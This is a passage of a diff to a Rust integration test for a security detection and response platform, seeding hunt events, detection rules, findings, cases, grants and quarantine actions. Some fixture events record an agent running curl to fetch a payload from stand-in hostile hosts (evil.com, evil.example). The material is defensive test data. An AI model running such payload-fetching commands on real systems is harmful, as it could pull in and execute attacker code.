+                    "endpointAgentId": "endpoint-1",
+                    "runtimeAgentId": "runtime-1",
+                    "principalType": "agent"
+                },
+                "sessionId": "session-1",
+                "grantId": "grant-1",
+                "detectionIds": ["finding-1"],
+                "target": {
+                    "kind": "process",
+                    "id": "1001",
+                    "name": "curl"
+                },
+                "evidence": {
+                    "rawRef": "hunt-envelope:hunt-evt-1",
+                    "envelopeHash": "hash-1",
+                    "issuer": "spiffe://tenant/acme",
+                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1",
+                    "signatureValid": true
+                },
+                "attributes": {
+                    "process": "/usr/bin/curl",
+                    "namespace": "default",
+                    "pod": "agent-pod-1",
+                    "url": "https://evil.com/payload"
+                }
+            },
+            "rawEnvelope": {"fact": {"schema": "clawdstrike.sdr.fact.tetragon_event.v1"}}
+        }),
+        serde_json::json!({
+            "event": {
+                "eventId": "hunt-evt-2",
+                "tenantId": harness.tenant_id.to_string(),
+                "source": "tetragon",
+                "kind": "process_exec",
+                "occurredAt": "2026-03-06T12:01:00Z",
+                "ingestedAt": "2026-03-06T12:01:01Z",
+                "severity": "medium",
+                "verdict": "allow",
+                "summary": "process_exec /usr/bin/ssh admin@example.net",
+                "actionType": "process",
+                "principal": {
+                    "principalId": "principal-1",
+                    "endpointAgentId": "endpoint-1",
+                    "runtimeAgentId": "runtime-1",
+                    "principalType": "agent"
+                },
+                "sessionId": "session-1",
+                "grantId": "grant-1",
+                "target": {
+                    "kind": "process",
+                    "id": "1002",
+                    "name": "ssh"
+                },
+                "evidence": {
+                    "rawRef": "hunt-envelope:hunt-evt-2",
+                    "envelopeHash": "hash-2",
+                    "issuer": "spiffe://tenant/acme",
+                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1",
+                    "signatureValid": true
+                },
+                "attributes": {
+                    "process": "/usr/bin/ssh",
+                    "namespace": "default",
+                    "pod": "agent-pod-1"
+                }
+            },
+            "rawEnvelope": {"fact": {"schema": "clawdstrike.sdr.fact.tetragon_event.v1"}}
+        }),
+        serde_json::json!({
+            "event": {
+                "eventId": "hunt-evt-3",
+                "tenantId": harness.tenant_id.to_string(),
+                "source": "hubble",
+                "kind": "network_flow",
+                "occurredAt": "2026-03-06T12:02:00Z",
+                "ingestedAt": "2026-03-06T12:02:01Z",
+                "severity": "medium",
+                "verdict": "forwarded",
+                "summary": "network flow to api.example.com:443",
+                "actionType": "network",
+                "principal": {
+                    "principalId": "principal-2",
+                    "endpointAgentId": "endpoint-2",
+                    "runtimeAgentId": "runtime-2",
+                    "principalType": "agent"
+                },
+                "sessionId": "session-2",
+                "target": {
+                    "kind": "network",
+                    "id": "443",
+                    "name": "api.example.com"
+                },
+                "evidence": {
+                    "rawRef": "hunt-envelope:hunt-evt-3",
+                    "envelopeHash": "hash-3",
+                    "issuer": "spiffe://tenant/acme",
+                    "schemaName": "clawdstrike.sdr.fact.hubble_flow.v1",
+                    "signatureValid": true
+                },
+                "attributes": {
+                    "namespace": "prod",
+                    "pod": "network-pod-1"
+                }
+            },
+            "rawEnvelope": {"fact": {"schema": "clawdstrike.sdr.fact.hubble_flow.v1"}}
+        }),
+    ] {
+        let response = request_json(
+            &harness.app,
+            Method::POST,
+            "/api/v1/hunt/events/ingest".to_string(),
+            Some(&harness.api_key),
+            Some(event),
+        )
+        .await;
+        assert_eq!(response.0, StatusCode::OK);
+    }
+}
+
+async fn seed_operator_flow_fixture(harness: &Harness) -> OperatorFlowFixture {
+    let agent_id = "agent-operator-e2e-1".to_string();
+    let session_id = "session-operator-flow-1".to_string();
+    let detection_raw_ref = "hunt-envelope:operator-flow-detection-1".to_string();
+    let response_raw_ref = "hunt-envelope:operator-flow-response-1".to_string();
+
+    let register_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/agents".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "agent_id": &agent_id,
+            "name": "Operator Endpoint",
+            "public_key": hush_core::Keypair::generate().public_key().to_hex(),
+            "role": "coder",
+            "trust_level": "high"
+        })),
+    )
+    .await;
+    assert_eq!(register_resp.0, StatusCode::OK);
+
+    let principal_row = sqlx::query::query(
+        "SELECT principal_id FROM agents WHERE tenant_id = $1 AND agent_id = $2",
+    )
+    .bind(harness.tenant_id)
+    .bind(&agent_id)
+    .fetch_one(&harness.db)
+    .await
+    .expect("fetch operator principal");
+    let principal_id: Uuid = principal_row
+        .try_get::<Option<Uuid>, _>("principal_id")
+        .expect("principal_id")
+        .expect("principal should be linked");
+
+    let response_subject = format!(
+        "{}.response.command.endpoint.{agent_id}",
+        tenant_subject_prefix(&harness.tenant_slug)
+    );
+    let js = async_nats::jetstream::new(harness.nats.clone());
+    spine::nats_transport::ensure_stream(
+        &js,
+        "response-action-integration",
+        vec![response_subject.clone()],
+        1,
+    )
+    .await
+    .expect("response action stream should exist");
+
+    let grant_keypair = hush_core::Keypair::generate();
+    let now = chrono::Utc::now().timestamp();
+    let mut grant_claims = hush_multi_agent::DelegationClaims::new(
+        hush_multi_agent::AgentId::new(principal_id.to_string())
+            .expect("principal id should be a valid agent id"),
+        hush_multi_agent::AgentId::new(format!("delegate:{}", Uuid::new_v4()))
+            .expect("delegate id should be valid"),
+        now,
+        now + 3600,
+        vec![hush_multi_agent::AgentCapability::DeployApproval],
+    )
+    .expect("build delegation claims");
+    grant_claims.pur = Some("operator containment".to_string());
+    grant_claims.ctx = Some(serde_json::json!({
+        "workflow": "fleet_operator_e2e"
+    }));
+    let grant_token =
+        hush_multi_agent::SignedDelegationToken::sign_with_public_key(grant_claims, &grant_keypair)
+            .expect("sign delegation token");
+
+    let grant_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/grants".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "token": grant_token,
+            "grant_type": "delegation",
+            "source_session_id": &session_id
+        })),
+    )
+    .await;
+    assert_eq!(grant_resp.0, StatusCode::OK);
+    assert_eq!(grant_resp.1["status"], "active");
+    let grant_id =
+        Uuid::parse_str(grant_resp.1["id"].as_str().expect("grant id")).expect("parse grant id");
+
+    let create_rule_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/rules".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "name": "Operator flow rule",
+            "description": "Detect suspicious operator workflow activity",
+            "severity": "high",
+            "source_format": "native_correlation",
+            "execution_mode": "streaming",
+            "source_text": "schema: clawdstrike.hunt.correlation.v1\nname: operator-flow-rule\nseverity: high\ndescription: e2e\nwindow: 30s\nconditions:\n  - source: tetragon\n    target_pattern: curl\n    bind: suspicious_exec\noutput:\n  title: Suspicious operator flow\n  evidence:\n    - suspicious_exec\n",
+            "tags": ["operator-flow", "integration"],
+            "enabled": true
+        })),
+    )
+    .await;
+    assert_eq!(create_rule_resp.0, StatusCode::OK);
+    let rule_id = Uuid::parse_str(create_rule_resp.1["id"].as_str().expect("rule id"))
+        .expect("parse rule id");
+
+    let detection_service = AlerterService::new(harness.db.clone());
+    let finding = detection_service
+        .create_detection_finding_for_test(
+            harness.tenant_id,
+            rule_id,
+            "operator-flow-rule",
+            "native_correlation",
+            "high",
+            "Suspicious operator flow",
+            "curl execution triggered an operator response workflow",
+            &[detection_raw_ref.as_str()],
+        )
+        .await
+        .expect("create e2e finding");
+
+    sqlx::query::query(
+        r#"UPDATE detection_findings
+           SET principal_id = $3,
+               session_id = $4,
+               grant_id = $5
+           WHERE tenant_id = $1
+             AND id = $2"#,
+    )
+    .bind(harness.tenant_id)
+    .bind(finding.id)
+    .bind(principal_id)
+    .bind(&session_id)
+    .bind(grant_id)
+    .execute(&harness.db)
+    .await
+    .expect("link finding to operator principal");
+
+    let case_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/cases".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "title": "Operator flow investigation",
+            "summary": "Investigate suspicious operator workflow activity",
+            "severity": "high",
+            "principalIds": [principal_id.to_string()],
+            "detectionIds": [finding.id.to_string()],
+            "tags": ["operator-flow"]
+        })),
+    )
+    .await;
+    assert_eq!(case_resp.0, StatusCode::OK);
+    let case_id = case_resp.1["id"].as_str().expect("case id").to_string();
+
+    let action_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/response-actions".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "actionType": "request_policy_reload",
+            "target": {
+                "kind": "endpoint",
+                "id": &agent_id
+            },
+            "reason": "Investigate suspicious operator flow",
+            "caseId": &case_id,
+            "sourceDetectionId": finding.id.to_string(),
+            "requireAcknowledgement": true,
+            "payload": {
+                "reloadMode": "full"
+            }
+        })),
+    )
+    .await;
+    assert_eq!(action_resp.0, StatusCode::OK);
+    assert_eq!(action_resp.1["status"], "queued");
+    let action_id =
+        Uuid::parse_str(action_resp.1["id"].as_str().expect("action id")).expect("parse action id");
+
+    OperatorFlowFixture {
+        agent_id,
+        session_id,
+        detection_raw_ref,
+        response_raw_ref,
+        principal_id,
+        response_subject,
+        grant_id,
+        finding_id: finding.id,
+        case_id,
+        action_id,
+    }
+}
+
+async fn seed_console_read_model_fixture(harness: &Harness) -> ConsoleFixture {
+    let principal_id = Uuid::new_v4();
+    let secondary_principal_id = Uuid::new_v4();
+    let swarm_id = Uuid::new_v4();
+    let project_id = Uuid::new_v4();
+    let capability_group_id = Uuid::new_v4();
+    let rule_id = Uuid::new_v4();
+    let detection_id = Uuid::new_v4();
+    let action_id = Uuid::new_v4();
+    let grant_id = Uuid::new_v4();
+
+    sqlx::query::query(
+        r#"INSERT INTO principals (
+               id,
+               tenant_id,
+               principal_type,
+               stable_ref,
+               display_name,
+               trust_level,
+               lifecycle_state,
+               liveness_state,
+               public_key,
+               metadata
+           ) VALUES (
+               $1,
+               $2,
+               'endpoint_agent',
+               'endpoint-1',
+               'Planner MacBook',
+               'high',
+               'active',
+               'active',
+               'pk-primary',
+               $3
+           )"#,
+    )
+    .bind(principal_id)
+    .bind(harness.tenant_id)
+    .bind(serde_json::json!({ "platform": "macos" }))
+    .execute(&harness.db)
+    .await
+    .expect("seed console principal");
+
+    sqlx::query::query(
+        r#"INSERT INTO principals (
+               id,
+               tenant_id,
+               principal_type,
+               stable_ref,
+               display_name,
+               trust_level,
+               lifecycle_state,
+               liveness_state,
+               metadata
+           ) VALUES (
+               $1,
+               $2,
+               'runtime_agent',
+               'runtime-1',
+               'Runtime Sidecar',
+               'medium',
+               'quarantined',
+               'stale',
+               '{}'::jsonb
+           )"#,
+    )
+    .bind(secondary_principal_id)
+    .bind(harness.tenant_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed secondary principal");
+
+    sqlx::query::query(
+        r#"INSERT INTO agents (
+               tenant_id,
+               agent_id,
+               name,
+               public_key,
+               role,
+               trust_level,
+               status,
+               last_heartbeat_at,
+               metadata,
+               principal_id
+           ) VALUES (
+               $1,
+               'endpoint-1',
+               'Planner MacBook',
+               'pk-primary',
+               'coder',
+               'high',
+               'active',
+               '2026-03-06T12:00:00Z'::timestamptz,
+               $2,
+               $3
+           )"#,
+    )
+    .bind(harness.tenant_id)
+    .bind(serde_json::json!({ "posture": "nominal", "daemon": "healthy" }))
+    .bind(principal_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed endpoint agent");
+
+    sqlx::query::query(
+        r#"INSERT INTO swarms (id, tenant_id, slug, name, kind)
+           VALUES ($1, $2, 'fleet-east', 'Fleet East', 'fleet')"#,
+    )
+    .bind(swarm_id)
+    .bind(harness.tenant_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed swarm");
+
+    sqlx::query::query(
+        r#"INSERT INTO projects (id, tenant_id, swarm_id, slug, name, environment)
+           VALUES ($1, $2, $3, 'payments-prod', 'Payments Prod', 'prod')"#,
+    )
+    .bind(project_id)
+    .bind(harness.tenant_id)
+    .bind(swarm_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed project");
+
+    sqlx::query::query(
+        r#"INSERT INTO capability_groups (id, tenant_id, name, capabilities)
+           VALUES ($1, $2, 'Responders', '["contain"]'::jsonb)"#,
+    )
+    .bind(capability_group_id)
+    .bind(harness.tenant_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed capability group");
+
+    for (target_kind, target_id, role) in [
+        ("swarm", swarm_id, Some("member")),
+        ("project", project_id, Some("service")),
+        ("capability_group", capability_group_id, Some("responder")),
+    ] {
+        sqlx::query::query(
+            r#"INSERT INTO principal_memberships (
+                   tenant_id,
+                   principal_id,
+                   target_kind,
+                   target_id,
+                   role
+               ) VALUES ($1, $2, $3, $4, $5)"#,
+        )
+        .bind(harness.tenant_id)
+        .bind(principal_id)
+        .bind(target_kind)
+        .bind(target_id)
+        .bind(role)
+        .execute(&harness.db)
+        .await
+        .expect("seed principal membership");
+    }
+
+    policy_distribution::upsert_active_policy(
+        &harness.db,
+        harness.tenant_id,
+        "mode: tenant-base\nregion: west\nkeep: true\n",
+        Some("console-read-model"),
+    )
+    .await
+    .expect("seed active policy");
+
+    for (target_kind, target_id, priority, policy_yaml, checksum) in [
+        (
+            "tenant",
+            None,
+            10_i32,
+            "region: east\ncontrols:\n  baseline: true\n",
+            Some("tenant-layer"),
+        ),
+        (
+            "swarm",
+            Some(swarm_id),
+            20_i32,
+            "mode: swarm\n",
+            Some("swarm-layer"),
+        ),
+        (
+            "principal",
+            Some(principal_id),
+            30_i32,
+            "final: true\n",
+            Some("principal-layer"),
+        ),
+    ] {
+        sqlx::query::query(
+            r#"INSERT INTO policy_attachments (
+                   tenant_id,
+                   target_kind,
+                   target_id,
+                   priority,
+                   policy_yaml,
+                   checksum_sha256,
+                   created_by
+               ) VALUES ($1, $2, $3, $4, $5, $6, 'integration')"#,
+        )
+        .bind(harness.tenant_id)
+        .bind(target_kind)
+        .bind(target_id)
+        .bind(priority)
+        .bind(policy_yaml)
+        .bind(checksum)
+        .execute(&harness.db)
+        .await
+        .expect("seed policy attachment");
+    }
+
+    sqlx::query::query(
+        r#"INSERT INTO detection_rules (
+               id,
+               tenant_id,
+               name,
+               description,
+               severity,
+               source_format,
+               engine_kind,
+               execution_mode,
+               created_by,
+               source_text
+           ) VALUES (
+               $1,
+               $2,
+               'console-rule',
+               'integration console rule',
+               'high',
+               'native_correlation',
+               'correlation',
+               'streaming',
+               'integration',
+               'rule: console'
+           )"#,
+    )
+    .bind(rule_id)
+    .bind(harness.tenant_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed detection rule");
+
+    sqlx::query::query(
+        r#"INSERT INTO detection_findings (
+               id,
+               tenant_id,
+               rule_id,
+               rule_name,
+               source_format,
+               severity,
+               status,
+               title,
+               summary,
+               principal_id,
+               session_id,
+               grant_id,
+               response_action_ids,
+               first_seen_at,
+               last_seen_at,
+               metadata,
+               created_at
+           ) VALUES (
+               $1,
+               $2,
+               $3,
+               'console-rule',
+               'native_correlation',
+               'high',
+               'open',
+               'Suspicious curl',
+               'Detected suspicious curl activity',
+               $4,
+               'session-1',
+               $5,
+               '[]'::jsonb,
+               '2026-03-06T12:00:00Z'::timestamptz,
+               '2026-03-06T12:05:00Z'::timestamptz,
+               '{}'::jsonb,
+               '2026-03-06T12:05:00Z'::timestamptz
+           )"#,
+    )
+    .bind(detection_id)
+    .bind(harness.tenant_id)
+    .bind(rule_id)
+    .bind(principal_id)
+    .bind(grant_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed detection finding");
+
+    sqlx::query::query(
+        r#"INSERT INTO response_actions (
+               id,
+               tenant_id,
+               action_type,
+               target_kind,
+               target_id,
+               requested_by_type,
+               requested_by_id,
+               requested_at,
+               reason,
+               source_detection_id,
+               payload,
+               status
+           ) VALUES (
+               $1,
+               $2,
+               'quarantine_principal',
+               'principal',
+               $3,
+               'user',
+               'operator@example.com',
+               '2026-03-06T12:06:00Z'::timestamptz,
+               'Contain quickly',
+               $4,
+               '{}'::jsonb,
+               'queued'
+           )"#,
+    )
+    .bind(action_id)
+    .bind(harness.tenant_id)
+    .bind(principal_id.to_string())
+    .bind(detection_id.to_string())
+    .execute(&harness.db)
+    .await
+    .expect("seed response action");
+
+    sqlx::query::query(
+        r#"INSERT INTO fleet_grants (
+               id,
+               tenant_id,
+               issuer_principal_id,
+               subject_principal_id,
+               audience,
+               token_jti,
+               delegation_depth,
+               lineage_chain,
+               capabilities,
+               capability_ceiling,
+               context,
+               issued_at,
+               expires_at,
+               status
+           ) VALUES (
+               $1,
+               $2,
+               $3,
+               $4,
+               'control-console',
+               'console-grant-1',
+               0,
+               '[]'::jsonb,
+               '["quarantine_principal"]'::jsonb,
+               '["quarantine_principal"]'::jsonb,
+               '{}'::jsonb,
+               '2026-03-06T11:55:00Z'::timestamptz,
+               '2026-03-06T13:00:00Z'::timestamptz,
+               'active'
+           )"#,
+    )
+    .bind(grant_id)
+    .bind(harness.tenant_id)
+    .bind(secondary_principal_id.to_string())
+    .bind(principal_id.to_string())
+    .execute(&harness.db)
+    .await
+    .expect("seed fleet grant");
+
+    let principal_node_id = format!("principal:{principal_id}");
+    let grant_node_id = format!("grant:{grant_id}");
+    let action_node_id = format!("response_action:{action_id}");
+
+    for (node_id, kind, label, state) in [
+        (
+            principal_node_id.as_str(),
+            "principal",
+            "Planner MacBook",
+            Some("active"),
+        ),
+        (
+            grant_node_id.as_str(),
+            "grant",
+            "Fleet quarantine grant",
+            Some("active"),
+        ),
+        (
+            action_node_id.as_str(),
+            "response_action",
+            "Quarantine principal",
+            Some("queued"),
+        ),
+    ] {
+        sqlx::query::query(
+            r#"INSERT INTO delegation_graph_nodes (
+                   tenant_id,
+                   id,
+                   kind,
+                   label,
+                   state,
+                   metadata
+               ) VALUES ($1, $2, $3, $4, $5, '{}'::jsonb)"#,
+        )
+        .bind(harness.tenant_id)
+        .bind(node_id)
+        .bind(kind)
+        .bind(label)
+        .bind(state)
+        .execute(&harness.db)
+        .await
+        .expect("seed graph node");
+    }
+
+    for (from_node_id, to_node_id, kind) in [
+        (
+            principal_node_id.as_str(),
+            grant_node_id.as_str(),
+            "received_grant",
+        ),
+        (
+            grant_node_id.as_str(),
+            action_node_id.as_str(),
+            "triggered_response_action",
+        ),
+    ] {
+        sqlx::query::query(
+            r#"INSERT INTO delegation_graph_edges (
+                   tenant_id,
+                   from_node_id,
+                   to_node_id,
+                   kind,
+                   metadata
+               ) VALUES ($1, $2, $3, $4, '{}'::jsonb)"#,
+        )
+        .bind(harness.tenant_id)
+        .bind(from_node_id)
+        .bind(to_node_id)
+        .bind(kind)
+        .execute(&harness.db)
+        .await
+        .expect("seed graph edge");
+    }
+
+    for (
+        event_id,
+        source,
+        kind,
+        timestamp,
+        ingested_at,
+        verdict,
+        summary,
+        action_type,
+        response_action_id,
+        detection_ids,
+        target_kind,
+        target_id,
+        target_name,
+        attributes,
+    ) in [
+        (
+            "console-hunt-1",
+            "tetragon",
+            "process_exec",
+            "2026-03-06T12:00:00Z",
+            "2026-03-06T12:00:01Z",
+            "allow",
+            "process_exec /usr/bin/curl https://evil.example/payload",
+            Some("process"),
+            None,
+            Vec::<String>::new(),
+            Some("process"),
+            Some("1001".to_string()),
+            Some("curl".to_string()),
+            serde_json::json!({
+                "process": "/usr/bin/curl",
+                "url": "https://evil.example/payload",
+                "namespace": "default",
+                "pod": "planner-1"
+            }),
+        ),
+        (
+            "console-hunt-2",
+            "response",
+            "response_action_updated",
+            "2026-03-06T12:05:00Z",
+            "2026-03-06T12:05:01Z",
+            "deny",
+            "response action queued for Planner MacBook",
+            Some("quarantine"),
+            Some(action_id.to_string()),
+            vec![detection_id.to_string()],
+            Some("principal"),
+            Some(principal_id.to_string()),
+            Some("Planner MacBook".to_string()),
+            serde_json::json!({
+                "status": "queued",
+                "operator": "operator@example.com"
+            }),
+        ),
+    ] {
+        sqlx::query::query(
+            r#"INSERT INTO hunt_events (
+                   event_id,
+                   tenant_id,
+                   source,
+                   kind,
+                   timestamp,
+                   ingested_at,
+                   verdict,
+                   severity,
+                   summary,
+                   action_type,
+                   session_id,
+                   endpoint_agent_id,
+                   runtime_agent_id,
+                   principal_id,
+                   grant_id,
+                   response_action_id,
+                   detection_ids,
+                   target_kind,
+                   target_id,
+                   target_name,
+                   envelope_hash,
+                   issuer,
+                   schema_name,
+                   signature_valid,
+                   raw_ref,
+                   attributes
+               ) VALUES (
+                   $1,
+                   $2,
+                   $3,
+                   $4,
+                   $5::timestamptz,
+                   $6::timestamptz,
+                   $7,
+                   'medium',
+                   $8,
+                   $9,
+                   'session-1',
+                   'endpoint-1',
+                   'runtime-1',
+                   $10,
+                   $11,
+                   $12,
+                   $13,
+                   $14,
+                   $15,
+                   $16,
+                   $17,
+                   'spiffe://tenant/acme-int',
+                   'clawdstrike.sdr.fact.console.v1',
+                   true,
+                   $18,
+                   $19
+               )"#,
+        )
+        .bind(event_id)
+        .bind(harness.tenant_id)
+        .bind(source)
+        .bind(kind)
+        .bind(timestamp)
+        .bind(ingested_at)
+        .bind(verdict)
+        .bind(summary)
+        .bind(action_type)
+        .bind(principal_id.to_string())
+        .bind(grant_id.to_string())
+        .bind(response_action_id)
+        .bind(detection_ids)
+        .bind(target_kind)
+        .bind(target_id)
+        .bind(target_name)
+        .bind(format!("hash-{event_id}"))
+        .bind(format!("hunt-envelope:{event_id}"))
+        .bind(attributes)
+        .execute(&harness.db)
+        .await
+        .expect("seed hunt event");
+    }
+
+    let noise_tenant_id = seed_tenant(&harness.db, "console-noise", "Console Noise").await;
+    let noise_principal_id = Uuid::new_v4();
+
+    sqlx::query::query(
+        r#"INSERT INTO principals (
+               id,
+               tenant_id,
+               principal_type,
+               stable_ref,
+               display_name,
+               trust_level,
+               lifecycle_state,
+               liveness_state,
+               metadata
+           ) VALUES (
+               $1,
+               $2,
+               'endpoint_agent',
+               'noise-endpoint',
+               'Noise Endpoint',
+               'medium',
+               'active',
+               'active',
+               '{}'::jsonb
+           )"#,
+    )
+    .bind(noise_principal_id)
+    .bind(noise_tenant_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed noise principal");
+
+    sqlx::query::query(
+        r#"INSERT INTO hunt_events (
+               event_id,
+               tenant_id,
+               source,
+               kind,
+               timestamp,
+               ingested_at,
+               verdict,
+               severity,
+               summary,
+               principal_id,
+               raw_ref,
+               attributes
+           ) VALUES (
+               'console-noise-1',
+               $1,
+               'tetragon',
+               'process_exec',
+               '2026-03-06T12:10:00Z'::timestamptz,
+               '2026-03-06T12:10:01Z'::timestamptz,
+               'allow',
+               'low',
+               'noise event',
+               $2,
+               'hunt-envelope:console-noise-1',
+               '{}'::jsonb
+           )"#,
+    )
+    .bind(noise_tenant_id)
+    .bind(noise_principal_id.to_string())
+    .execute(&harness.db)
+    .await
+    .expect("seed noise hunt event");
+
+    ConsoleFixture {
+        principal_id,
+        grant_id,
+        action_id,
     }
 }
 
@@ -573,6 +3583,39 @@ async fn request_json(
     }
     if let Some(key) = api_key {
         builder = builder.header("x-api-key", key);
+    }
+    let request = builder.body(body).expect("build request");
+
+    let response = app.clone().oneshot(request).await.expect("router request");
+    let status = response.status();
+    let bytes = to_bytes(response.into_body(), 2 * 1024 * 1024)
+        .await
+        .expect("read response body");
+    let body = if bytes.is_empty() {
+        serde_json::json!({})
+    } else {
+        serde_json::from_slice::<Value>(&bytes).expect("response json")
+    };
+    (status, body)
+}
+
+async fn request_json_bearer(
+    app: &axum::Router,
+    method: Method,
+    path: String,
+    api_key: Option<&str>,
+    json_body: Option<Value>,
+) -> (StatusCode, Value) {
+    let body = match &json_body {
+        Some(value) => Body::from(serde_json::to_vec(value).expect("serialize body")),
+        None => Body::empty(),
+    };
+    let mut builder = Request::builder().method(method).uri(path);
+    if json_body.is_some() {
+        builder = builder.header("content-type", "application/json");
+    }
+    if let Some(key) = api_key {
+        builder = builder.header("authorization", format!("Bearer {key}"));
     }
     let request = builder.body(body).expect("build request");
 
